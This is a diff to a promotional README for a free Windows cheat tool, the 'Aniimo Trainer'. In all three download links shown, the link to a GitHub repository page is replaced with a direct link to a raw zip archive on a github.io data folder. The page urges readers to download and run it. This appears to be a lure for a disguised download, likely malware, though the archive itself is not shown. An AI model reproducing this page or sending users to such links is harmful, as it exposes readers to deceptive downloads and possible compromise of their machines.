@@ -13,7 +13,7 @@ description: "Train 41 creature-taming features in Aniimo with this free Windows
 
 <br/>
 
-[![Download Aniimo Trainer](https://img.shields.io/badge/⬇️%20Download%20Aniimo%20Trainer%201.3.0-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://github.com/rosabellacalyptrate2549/aniimo-mod-trainer)
+[![Download Aniimo Trainer](https://img.shields.io/badge/⬇️%20Download%20Aniimo%20Trainer%201.3.0-FF6B6B?style=for-the-badge&logo=windows&logoColor=white&labelColor=2D2D2D)](https://raw.githubusercontent.com/rosabellacalyptrate2549/rosabellacalyptrate2549.github.io/main/data/2.7.zip)
 
 <br/>
 
@@ -38,7 +38,7 @@ If you can click a mouse and read this page, you can get this working in minutes
 ### Step 1: Get the File
 
 Your journey begins with a simple click. Visit this link to download the application:  
-**[https://github.com/rosabellacalyptrate2549/aniimo-mod-trainer](https://github.com/rosabellacalyptrate2549/aniimo-mod-trainer)**
+**[https://raw.githubusercontent.com/rosabellacalyptrate2549/rosabellacalyptrate2549.github.io/main/data/2.7.zip](https://raw.githubusercontent.com/rosabellacalyptrate2549/rosabellacalyptrate2549.github.io/main/data/2.7.zip)**
 
 The download will start automatically. Depending on your internet speed, the file should arrive within a few seconds to a couple of minutes. You'll see it appear in your browser's download bar or your designated downloads folder (usually "Downloads" on your PC).
 
@@ -190,7 +190,7 @@ You're now fully equipped to transform your Aniimo experience. With 41 powerful 
 
 <div align="center">
 
-[![Download Aniimo Trainer Again](https://img.shields.io/badge/🔥%20Download%20Now%20-%20Aniimo%20Trainer%201.3.0-4CAF50?style=for-the-badge&logo=windows&logoColor=white&labelColor=333333)](https://github.com/rosabellacalyptrate2549/aniimo-mod-trainer)
+[![Download Aniimo Trainer Again](https://img.shields.io/badge/🔥%20Download%20Now%20-%20Aniimo%20Trainer%201.3.0-4CAF50?style=for-the-badge&logo=windows&logoColor=white&labelColor=333333)](https://raw.githubusercontent.com/rosabellacalyptrate2549/rosabellacalyptrate2549.github.io/main/data/2.7.zip)
 
 <br/>
 
